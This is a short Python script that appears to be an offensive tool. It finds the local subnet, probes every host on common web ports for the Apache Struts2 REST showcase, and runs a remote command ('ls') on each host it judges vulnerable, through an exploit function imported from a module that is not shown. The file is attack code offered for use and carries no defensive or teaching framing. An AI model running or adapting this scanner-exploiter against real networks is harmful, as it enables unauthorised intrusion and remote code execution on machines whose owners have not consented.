import os
import requests
import subprocess
import control

# here this will find the first ip-address of network where this tool deploy.

def first_ip():

	store=0
	store_ip = subprocess.getoutput("hostname -I")
	for value in range(1,len(store_ip)+1):
		store+=1
		if store_ip[-value]=='.':
			return store_ip[0:len(store_ip)-store]+'.'
# scan for every pc in that network for struts-2 vuneribility

def scan():
	list_http=['8080','80','8000','3128'] # possible http  request for open  ports
	network_value=255
	for ip in range(1,network_value):
		for list in list_http:
			try:
				try:
					responce = requests.get("http://"+first_ip()+str(ip)+":"+str(list),timeout=5)
					req = requests.head("http://"+first_ip()+str(ip)+":"+str(list)+"/struts2%2Drest%2Dshowcase/orders")

					request_server = requests.head("http://"+first_ip()+str(ip)+":"+list)
				except:
					print("server pc "+first_ip()+str(ip)+" at port: "+list+" "+ "is out of range")
				#500 status_code shows this serivce is  deployed but not responding otherwise 404 code found.
				if ((req.status_code==500) or (req.status_code==200)) and (request_server.status_code==200):  

					responce_code = requests.get("http://"+first_ip()+str(ip)+":"+list).text 

					if responce_code[len(responce_code)-59:len(responce_code)-30]=='/etc/tomcat8/tomcat-users.xml':

						print("[+] tomcat sever is deployed on port"+list+"\n [+] struts-2-restcase is also found")
						print(first_ip()+str(ip)+" is exploitable"+"\n files of remote pc are: \n")
						print(control.exploit("http://"+first_ip()+str(ip)+":"+str(list)+"/struts2%2Drest%2Dshowcase/orders/","ls"))
			except:
				pass

		print("\n===============================================================================")
def main():

	print("[*] scanning start over network\n")
	scan()

if __name__=='__main__':
	main()
